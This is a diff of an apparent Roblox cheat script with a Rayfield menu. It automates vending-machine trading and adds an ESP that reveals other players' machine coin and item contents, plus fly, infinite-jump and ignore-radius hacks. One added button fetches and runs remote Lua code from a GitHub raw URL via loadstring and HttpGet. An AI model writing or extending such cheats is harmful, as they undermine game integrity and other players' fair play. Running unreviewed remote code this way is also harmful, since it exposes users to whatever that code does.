@@ -1064,20 +1061,40 @@ local Dropdown = VendingTab:CreateDropdown({
 	end,
 })
 
-pcall(function() UpdateDropdown(true) end)
-
-local updateDropdownDebounce = 0
+local lastDropdownUpdateTime = 0
+local dropdownUpdateInterval = 15
+local lastDropdownItems = {}
 UpdateDropdown = function(force)
-	if not force then
-		updateDropdownDebounce += 1
-	end
-	if not force and updateDropdownDebounce <= 10 then
+	local now = tick()
+	if not force and now - lastDropdownUpdateTime < dropdownUpdateInterval then
 		return
 	end
+	lastDropdownUpdateTime = now
 
-	allBackpackItems = GetBackpackItems()
+	local newItems = GetBackpackItems()
+	local changed = #newItems ~= #lastDropdownItems
+	if not changed then
+		for i, v in ipairs(newItems) do
+			if v ~= lastDropdownItems[i] then
+				changed = true
+				break
+			end
+		end
+	end
+	if not force and not changed then return end
+	lastDropdownItems = newItems
+	allBackpackItems = newItems
 
-	filteredItems = allBackpackItems
+	filteredItems = {}
+	if searchItemValue == "" then
+		filteredItems = allBackpackItems
+	else
+		for _, item in ipairs(allBackpackItems) do
+			if item:lower():find(searchItemValue, 1, true) then
+				table.insert(filteredItems, item)
+			end
+		end
+	end
 
 	if Dropdown and type(Dropdown.Refresh) == "function" then
 		local defaultOption = filteredItems[1] or "Empty"
@@ -1088,9 +1105,23 @@ UpdateDropdown = function(force)
 			end
 		end)
 	end
-
-	updateDropdownDebounce = 0
 end
+
+pcall(function() UpdateDropdown() end)
+registerConnection(Backpack.ChildAdded:Connect(function() UpdateDropdown() end))
+registerConnection(Backpack.ChildRemoved:Connect(function() UpdateDropdown() end))
+
+local manualItemName = ""
+local ManualItemInput = VendingTab:CreateInput({
+	Name = "Manual Item Selection",
+	CurrentValue = "",
+	PlaceholderText = "Type item name here",
+	RemoveTextAfterFocusLost = false,
+	Flag = "ManualItemInput",
+	Callback = function(Text)
+		manualItemName = Text:gsub("^%s*(.-)%s*$", "%1")
+	end,
+})
 
 local ItemAmountValue = ""
 local Input = VendingTab:CreateInput({
@@ -1122,12 +1153,18 @@ local ItemActionButton = VendingTab:CreateButton({
 	Callback = function()
 		if ItemMode == "Deposit" then
 			local selectedItem = Dropdown.CurrentOption and Dropdown.CurrentOption[1] or "Empty"
+			if selectedItem == "Empty" and manualItemName ~= "" then
+				selectedItem = manualItemName
+			end
 			local amount = tonumber(ItemAmountValue) or 1
 			if selectedItem ~= "Empty" then
 				depositItemsInRadius(selectedItem, amount)
 			end
 		elseif ItemMode == "Deposit (Max)" then
 			local selectedItem = Dropdown.CurrentOption and Dropdown.CurrentOption[1] or "Empty"
+			if selectedItem == "Empty" and manualItemName ~= "" then
+				selectedItem = manualItemName
+			end
 			if selectedItem ~= "Empty" then
 				local tool = Backpack:FindFirstChild(selectedItem)
 				if tool then
@@ -1135,20 +1172,10 @@ local ItemActionButton = VendingTab:CreateButton({
 				end
 			end
 		elseif ItemMode == "Withdraw" then
-			local selectedItem = Dropdown.CurrentOption and Dropdown.CurrentOption[1] or "Empty"
 			local amount = tonumber(ItemAmountValue) or nil
-			if selectedItem ~= "Empty" then
-				withdrawVendingsInRadius(false, amount, true, nil, selectedItem)
-			else
-				withdrawVendingsInRadius(false, amount)
-			end
+			withdrawVendingsInRadius(false, amount, true, nil, nil)
 		elseif ItemMode == "Withdraw (Max)" then
-			local selectedItem = Dropdown.CurrentOption and Dropdown.CurrentOption[1] or "Empty"
-			if selectedItem ~= "Empty" then
-				withdrawVendingsInRadius(true, nil, true, nil, selectedItem)
-			else
-				withdrawVendingsInRadius(true)
-			end
+			withdrawVendingsInRadius(true, nil, true, nil, nil)
 		end
 	end,
 })
@@ -1168,12 +1195,18 @@ local LoopItemToggle = VendingTab:CreateToggle({
 				while loopItemEnabled do
 					if ItemMode == "Deposit" then
 						local selectedItem = Dropdown.CurrentOption and Dropdown.CurrentOption[1] or "Empty"
+						if selectedItem == "Empty" and manualItemName ~= "" then
+							selectedItem = manualItemName
+						end
 						local amount = tonumber(ItemAmountValue) or 1
 						if selectedItem ~= "Empty" then
 							depositItemsInRadius(selectedItem, amount, false, myGen)
 						end
 					elseif ItemMode == "Deposit (Max)" then
 						local selectedItem = Dropdown.CurrentOption and Dropdown.CurrentOption[1] or "Empty"
+						if selectedItem == "Empty" and manualItemName ~= "" then
+							selectedItem = manualItemName
+						end
 						if selectedItem ~= "Empty" then
 							local tool = Backpack:FindFirstChild(selectedItem)
 							if tool then
@@ -1186,23 +1219,13 @@ local LoopItemToggle = VendingTab:CreateToggle({
 							end
 						end
 					elseif ItemMode == "Withdraw" then
-						local selectedItem = Dropdown.CurrentOption and Dropdown.CurrentOption[1] or "Empty"
 						local amount = tonumber(ItemAmountValue) or nil
-						if selectedItem ~= "Empty" then
-							withdrawVendingsInRadius(false, amount, false, myGen, selectedItem)
-						else
-							withdrawVendingsInRadius(false, amount, false, myGen)
-						end
+						withdrawVendingsInRadius(false, amount, false, myGen, nil)
 					elseif ItemMode == "Withdraw (Max)" then
-						local selectedItem = Dropdown.CurrentOption and Dropdown.CurrentOption[1] or "Empty"
-						if selectedItem ~= "Empty" then
-							withdrawVendingsInRadius(true, nil, false, myGen, selectedItem)
-						else
-							withdrawVendingsInRadius(true, nil, false, myGen)
-						end
+						withdrawVendingsInRadius(true, nil, false, myGen, nil)
 					end
 					if loopItemEnabled then
-						task.wait(WITHDRAW_LOOP_DELAY)
+						task.wait(withdrawLoopDelay)
 					end
 				end
 			end)
@@ -1222,10 +1245,10 @@ local ItemLoopDelaySlider = VendingTab:CreateSlider({
 	Range = {0.3, 25},
 	Increment = 0.1,
 	Suffix = " seconds",
-	CurrentValue = WITHDRAW_LOOP_DELAY,
+	CurrentValue = withdrawLoopDelay,
 	Flag = "ItemLoopDelaySlider",
 	Callback = function(Value)
-		WITHDRAW_LOOP_DELAY = Value
+		withdrawLoopDelay = Value
 	end,
 })
 
@@ -1234,7 +1257,7 @@ local PriceSection = VendingTab:CreateSection("Price & Mode Management")
 local PriceModeDropdown = VendingTab:CreateDropdown({
 	Name = "Vending Mode",
 	Options = {"Sell", "Buy"},
-	CurrentOption = {"Sell"},
+	CurrentOption = {"None"},
 	MultipleOptions = false,
 	Flag = "PriceModeDropdown",
 	Callback = function(Options)
@@ -1333,7 +1356,7 @@ local LoopCoinToggle = VendingTab:CreateToggle({
 							local amount = parseAmount(CoinInputValue)
 							if amount and amount > 0 then
 								task.spawn(function()
-									depositCoinsIntoVending(amount, false, false, myGen)
+									depositCoinsIntoVending(amount, false, true, myGen)
 								end)
 							end
 						end
@@ -1341,7 +1364,7 @@ local LoopCoinToggle = VendingTab:CreateToggle({
 						local maxCoins = LP:GetAttribute("Coins") or 0
 						if maxCoins > 0 then
 							task.spawn(function()
-								depositCoinsIntoVending(maxCoins, false, false, myGen)
+									depositCoinsIntoVending(maxCoins, false, true, myGen)
 							end)
 						end
 					elseif CoinMode == "Withdraw" then
@@ -1359,7 +1382,7 @@ local LoopCoinToggle = VendingTab:CreateToggle({
 							end)
 					end
 					if loopCoinEnabled then
-						task.wait(COIN_LOOP_DELAY)
+						task.wait(coinLoopDelay)
 					end
 				end
 			end)
@@ -1375,14 +1398,14 @@ local LoopCoinToggle = VendingTab:CreateToggle({
 })
 
 local CoinLoopDelaySlider = VendingTab:CreateSlider({
-	Name = "Coin Loop Delay",
+	Name = "Coin Action Loop Delay",
 	Range = {0.1, 25},
 	Increment = 0.1,
 	Suffix = " seconds",
-	CurrentValue = COIN_LOOP_DELAY,
+	CurrentValue = coinLoopDelay,
 	Flag = "CoinLoopDelaySlider",
 	Callback = function(Value)
-		COIN_LOOP_DELAY = Value
+		coinLoopDelay = Value
 	end,
 })
 
@@ -1412,7 +1435,7 @@ local SpeedSlider = OpeningTab:CreateSlider({
 	end,
 })
 
-registerConnection(RunService.Heartbeat:Connect(function(deltaTime)
+registerConnection(RunS.Heartbeat:Connect(function(deltaTime)
 	if openingEnabled then
 		lastOpeningTime = lastOpeningTime + deltaTime
 		if lastOpeningTime >= openingSpeed then
@@ -1424,43 +1447,107 @@ registerConnection(RunService.Heartbeat:Connect(function(deltaTime)
 	end
 end))
 
-local function getVendingTopPosition(model)
-	if not model then return nil end
-	local bestPart = nil
-	local bestTopY = -math.huge
+local MovementSection = MovementTab:CreateSection("Movement")
 
-	for _, d in ipairs(model:GetDescendants()) do
-		if d:IsA("BasePart") and d.Parent then
-			local sizeY = (d.Size and d.Size.Y) or 0
-			local topY = d.Position.Y + sizeY * 0.5
-			if topY > bestTopY then
-				bestTopY = topY
-				bestPart = d
-			end
+local flyEnabled = false
+local flySpeed = 20
+local flyBodyGyro = nil
+
+local function stopFly()
+	if flyBodyVelocity then flyBodyVelocity:Destroy() flyBodyVelocity = nil end
+	if flyBodyGyro then flyBodyGyro:Destroy() flyBodyGyro = nil end
+	local char = LP.Character
+	if char and char:FindFirstChild("Humanoid") then
+		char.Humanoid.PlatformStand = false
+	end
+end
+
+local function startFly()
+	stopFly()
+	local char = LP.Character
+	local hrp = char and char:FindFirstChild("HumanoidRootPart")
+	if not hrp then return end
+	
+	local hum = char:FindFirstChild("Humanoid")
+	if hum then hum.PlatformStand = true end
+
+	flyBodyVelocity = Instance.new("BodyVelocity", hrp)
+	flyBodyVelocity.Velocity = Vector3.new(0,0,0)
+	flyBodyVelocity.MaxForce = Vector3.new(9e9, 9e9, 9e9)
+
+	flyBodyGyro = Instance.new("BodyGyro", hrp)
+	flyBodyGyro.P = 9e4
+	flyBodyGyro.maxTorque = Vector3.new(9e9, 9e9, 9e9)
+	flyBodyGyro.CFrame = hrp.CFrame
+end
+
+MovementTab:CreateToggle({
+	Name = "Fly",
+	CurrentValue = false,
+	Flag = "FlyToggle",
+	Callback = function(Value)
+		flyEnabled = Value
+		if flyEnabled then
+			startFly()
+		else
+			stopFly()
+		end
+	end,
+})
+
+registerConnection(RunS.RenderStepped:Connect(function()
+	if not flyEnabled then return end
+	local char = LP.Character
+	local hrp = char and char:FindFirstChild("HumanoidRootPart")
+	if not hrp or not flyBodyVelocity or not flyBodyGyro then 
+		if flyEnabled and hrp then startFly() end
+		return 
+	end
+	
+	local cam = workspace.CurrentCamera
+	local moveDir = Vector3.new()
+	
+	if UIS:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + cam.CFrame.LookVector end
+	if UIS:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir - cam.CFrame.LookVector end
+	if UIS:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + cam.CFrame.RightVector end
+	if UIS:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir - cam.CFrame.RightVector end
+	if UIS:IsKeyDown(Enum.KeyCode.Space) then moveDir = moveDir + Vector3.new(0, 1, 0) end
+	if UIS:IsKeyDown(Enum.KeyCode.LeftControl) then moveDir = moveDir - Vector3.new(0, 1, 0) end
+	
+	flyBodyVelocity.Velocity = moveDir * flySpeed
+	flyBodyGyro.CFrame = cam.CFrame
+end))
+
+local infJump = false
+MovementTab:CreateToggle({
+	Name = "Infinite Jump",
+	CurrentValue = false,
+	Flag = "InfJumpToggle",
+	Callback = function(Value)
+		infJump = Value
+	end,
+})
+
+registerConnection(UIS.JumpRequest:Connect(function()
+	if infJump then
+		local char = LP.Character
+		local hum = char and char:FindFirstChild("Humanoid")
+		if hum then
+			hum:ChangeState(Enum.HumanoidStateType.Jumping)
 		end
 	end
+end))
 
-	if bestPart then
-		return Vector3.new(bestPart.Position.X, bestTopY, bestPart.Position.Z), bestPart
-	end
+local MiscSection = MiscTab:CreateSection("Misc")
 
-	if model.PrimaryPart then
-		local p = model.PrimaryPart
-		return p.Position, p
-	end
-
-	if model:IsA("BasePart") then
-		local p = model
-		return p.Position, p
-	end
-
-	local ok, cframe = pcall(function() return model:GetModelCFrame() end)
-	if ok and cframe then
-		return cframe.Position, nil
-	end
-
-	return nil, nil
-end
+MiscTab:CreateButton({
+	Name = "Kawaii Aura",
+	Callback = function()
+		pcall(function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/KAWAII-AURA/main/kawaii_aura.lua", true))()
+		end)
+	end,
+})
 
 local SettingsSection = SettingsTab:CreateSection("Vending Machine Stuff")
 
@@ -1468,7 +1555,7 @@ local CircleToggle = false
 local CircleSegments = 32
 local CircleColor = Color3.fromRGB(200, 150, 255)
 local CircleThickness = 3
-local CircleRadius = VENDING_RADIUS
+local CircleRadius = vendingRadius
 local CircleHeightOffset = 0.5
 local CircleUpdateCounter = 0
 
@@ -1515,11 +1602,13 @@ local function UpdateCircle()
 	end
 end
 
-registerConnection(RunService.RenderStepped:Connect(UpdateCircle))
+registerConnection(RunS.RenderStepped:Connect(UpdateCircle))
 
 local espLabels = {}
 local espEnabled = false
 local espCache = {}
+local cachedVendingMachines = {}
+local espScannerActive = false
 
 local labelPool = {}
 local function acquireLabel()
@@ -1548,8 +1637,6 @@ end
 local ESP_UPDATE_INTERVAL = 0.3
 local espScanAccumulator = 0
 local MAX_ESP_LABELS = 2
-local espRenderUpdateCounter = 0
-local ESP_RENDER_UPDATE_RATE = 3
 
 local _candidates = {}
 local _enforceList = {}
@@ -1608,6 +1695,36 @@ local function enforceMaxEsp()
 	end
 end
 
+local function EspScannerLoop()
+	while espEnabled and espScannerActive do
+		local newCache = {}
+		local islands = WS:FindFirstChild("Islands")
+		if islands then
+			for _, island in ipairs(islands:GetChildren()) do
+				if not espEnabled then break end
+				local blocks = island:FindFirstChild("Blocks")
+				if blocks then
+					local children = blocks:GetChildren()
+					for i, v in ipairs(children) do
+						if not espEnabled then break end
+						if v.Name == "vendingMachine1" or v.Name == "vendingMachine" or v.Name == "vendingMachineIndustrial" then
+							local part = v:FindFirstChildWhichIsA("BasePart") or v.PrimaryPart
+							if part then
+								table.insert(newCache, {v = v, part = part})
+							end
+						end
+						if i % 300 == 0 then task.wait() end
+					end
+				end
+				task.wait()
+			end
+		end
+		cachedVendingMachines = newCache
+		task.wait(3)
+	end
+	espScannerActive = false
+end
+
 local function UpdateVendingESP_Scan(deltaTime)
 	if not espEnabled then return end
 	
@@ -1633,48 +1750,23 @@ local function UpdateVendingESP_Scan(deltaTime)
 
 	clearTable(_candidates)
 	local candidates = _candidates
-	local VENDING_RADIUS_SQ = VENDING_RADIUS * VENDING_RADIUS
+	local vendingRadiusSq = vendingRadius * vendingRadius
 	local hrpPos = hrp.Position
 
-	for _, island in ipairs(islands:GetChildren()) do
-		local blocks = island:FindFirstChild("Blocks")
-		if not blocks then continue end
+	for _, data in ipairs(cachedVendingMachines) do
+		local v = data.v
+		local part = data.part
+		if not v or not v.Parent or not part or not part.Parent then continue end
 
-		for _, v in ipairs(blocks:GetChildren()) do
-			if v.Name ~= "vendingMachine1" and v.Name ~= "vendingMachine" and v.Name ~= "vendingMachineIndustrial" then continue end
-
-			local part = v:FindFirstChildWhichIsA("BasePart")
-			if not part then continue end
-			
-			local partPos = part.Position
-			local dx = partPos.X - hrpPos.X
-			local dy = partPos.Y - hrpPos.Y
-			local dz = partPos.Z - hrpPos.Z
-			local distSq = dx * dx + dy * dy + dz * dz
-			
-			if distSq > VENDING_RADIUS_SQ then continue end
-
-			local coinBalance = v:FindFirstChild("CoinBalance")
-			local coins = coinBalance and coinBalance.Value or 0
-
-			local contents = v:FindFirstChild("SellingContents")
-			local itemCount = 0
+		local partPos = part.Position
+		local dx = partPos.X - hrpPos.X
+		local dy = partPos.Y - hrpPos.Y
+		local dz = partPos.Z - hrpPos.Z
+		local distSq = dx * dx + dy * dy + dz * dz
 		
-			if contents then
-				for _, item in ipairs(contents:GetChildren()) do
-					local amt = item:FindFirstChild("Amount")
-					local a = 0
-					if amt and type(amt.Value) == "number" then
-						a = amt.Value
-					end
-					if a > 0 then
-						itemCount = itemCount + a
-					end
-				end
-			end
+		if distSq > vendingRadiusSq then continue end
 
-			candidates[#candidates + 1] = {v = v, topPos = partPos + Vector3.new(0, 2, 0), distSq = distSq, coins = coins, itemCount = itemCount}
-		end
+		candidates[#candidates + 1] = {v = v, topPos = partPos + Vector3.new(0, 2, 0), distSq = distSq}
 	end
 
 	local activeVendings = {}
@@ -1688,9 +1780,23 @@ local function UpdateVendingESP_Scan(deltaTime)
 		local entry = candidates[i]
 		local v = entry.v
 		activeVendings[v] = true
-
-		local coins = entry.coins
-		local itemCount = entry.itemCount
+		
+		local coinBalance = v:FindFirstChild("CoinBalance")
+		local coins = coinBalance and coinBalance.Value or 0
+		local contents = v:FindFirstChild("SellingContents")
+		local itemCount = 0
+		if contents then
+			for _, item in ipairs(contents:GetChildren()) do
+				local amt = item:FindFirstChild("Amount")
+				local a = 0
+				if amt and type(amt.Value) == "number" then
+					a = amt.Value
+				end
+				if a > 0 then
+					itemCount = itemCount + a
+				end
+			end
+		end
 		
 		local hasChanged = not espCache[v]
 		if espCache[v] then
@@ -1736,12 +1842,6 @@ end
 local function UpdateVendingESP_Render()
 	if not espEnabled then return end
 	
-	espRenderUpdateCounter = espRenderUpdateCounter + 1
-	if espRenderUpdateCounter < ESP_RENDER_UPDATE_RATE then
-		return
-	end
-	espRenderUpdateCounter = 0
-	
 	local cam = workspace.CurrentCamera
 	if not cam then return end
 
@@ -1771,8 +1871,8 @@ local function UpdateVendingESP_Render()
 	end
 end
 
-registerConnection(RunService.Heartbeat:Connect(UpdateVendingESP_Scan))
-registerConnection(RunService.RenderStepped:Connect(UpdateVendingESP_Render))
+registerConnection(RunS.Heartbeat:Connect(UpdateVendingESP_Scan))
+registerConnection(RunS.RenderStepped:Connect(UpdateVendingESP_Render))
 
 
 
@@ -1844,12 +1944,12 @@ local function getVendingMachineAtMouse()
 	return closest
 end
 
-registerConnection(UserInputService.InputBegan:Connect(function(input, gameProcessed)
+registerConnection(UIS.InputBegan:Connect(function(input, gameProcessed)
 	if gameProcessed or not selectionModeEnabled then return end
 	
 	if input.UserInputType == Enum.UserInputType.MouseButton1 then
-		local isCtrlHeld = UserInputService:IsKeyDown(Enum.KeyCode.LeftAlt) or UserInputService:IsKeyDown(Enum.KeyCode.RightAlt) or
-							UserInputService:IsKeyDown(Enum.KeyCode.LeftMeta) or UserInputService:IsKeyDown(Enum.KeyCode.RightMeta)
+		local isCtrlHeld = UIS:IsKeyDown(Enum.KeyCode.LeftAlt) or UIS:IsKeyDown(Enum.KeyCode.RightAlt) or
+							UIS:IsKeyDown(Enum.KeyCode.LeftMeta) or UIS:IsKeyDown(Enum.KeyCode.RightMeta)
 		if isCtrlHeld then
 			pcall(function()
 				local vending = getVendingMachineAtMouse()
@@ -1885,11 +1985,17 @@ SettingsTab:CreateToggle({
 	Callback = function(Value)
 		espEnabled = Value
 		if not espEnabled then
+			espScannerActive = false
 			for _, labelData in pairs(espLabels) do
 				pcall(function() releaseLabel(labelData.label) end)
 			end
 			espLabels = {}
 			espCache = {}
+		else
+			if not espScannerActive then
+				espScannerActive = true
+				task.spawn(EspScannerLoop)
+			end
 		end
 	end,
 })
@@ -1916,11 +2022,11 @@ local VendingRadiusSlider = SettingsTab:CreateSlider({
 	Range = {5, 450},
 	Increment = 0.5,
 	Suffix = " studs",
-	CurrentValue = VENDING_RADIUS,
+	CurrentValue = vendingRadius,
 	Flag = "VendingRadiusSlider",
 	Callback = function(Value)
 		if not ignoreRadiusEnabled then
-			VENDING_RADIUS = Value
+			vendingRadius = Value
 			CircleRadius = Value
 		end
 	end,
@@ -1933,11 +2039,11 @@ SettingsTab:CreateToggle({
 	Callback = function(Value)
 		ignoreRadiusEnabled = Value
 		if Value then
-			VENDING_RADIUS = 10000
+			vendingRadius = 10000
 			CircleRadius = 10000
 			pcall(function() VendingRadiusSlider:Disable() end)
 		else
-			VENDING_RADIUS = 15
+			vendingRadius = 15
 			CircleRadius = 15
 			pcall(function() VendingRadiusSlider:Enable() end)
 		end
@@ -1977,13 +2083,14 @@ SettingsTab:CreateButton({
 		end
 		selectionBoxLines = {}
 		selectedVendingMachines = {}
+		vendingBoundingBoxCache = {}
 		Rayfield:Notify({Title = "Selection", Content = "All selections cleared", Duration = 2, Image = 11401835376})
 	end,
 })
 
 local SettingsSection = SettingsTab:CreateSection("Game Settings")
 
-local SeasonOptions = {"summer", "winter"}
+local SeasonOptions = {"summer", "winter", "fall"}
 local SeasonChoice = "summer"
 
 local SeasonPresses = {}
@@ -2054,8 +2161,9 @@ _G.VendingManagerCleanup = function()
 	pcall(function() if coinLoopThread then task.cancel(coinLoopThread) coinLoopThread = nil end end)
 	pcall(function() loopCoinEnabled = false end)
 	pcall(function() loopItemEnabled = false end)
-	pcall(function() loopDepositEnabled = false end)
 	pcall(function() openingEnabled = false end)
+	pcall(function() espScannerActive = false end)
+	pcall(function() if stopFly then stopFly() end end)
 
 	pcall(function()
 		if CircleLines and type(CircleLines) == "table" then
@@ -2072,6 +2180,7 @@ _G.VendingManagerCleanup = function()
 		end
 		selectionBoxLines = {}
 		selectedVendingMachines = {}
+		vendingBoundingBoxCache = {}
 	end)
 
 	pcall(function()
@@ -2092,6 +2201,12 @@ _G.VendingManagerCleanup = function()
 
 	_G.VendingManagerCleanup = nil
 end
+
+registerConnection(LP.OnTeleport:Connect(function()
+	if _G.VendingManagerCleanup then
+		pcall(_G.VendingManagerCleanup)
+	end
+end))
 
 SettingsTab:CreateButton({
 	Name = "Unload Script",
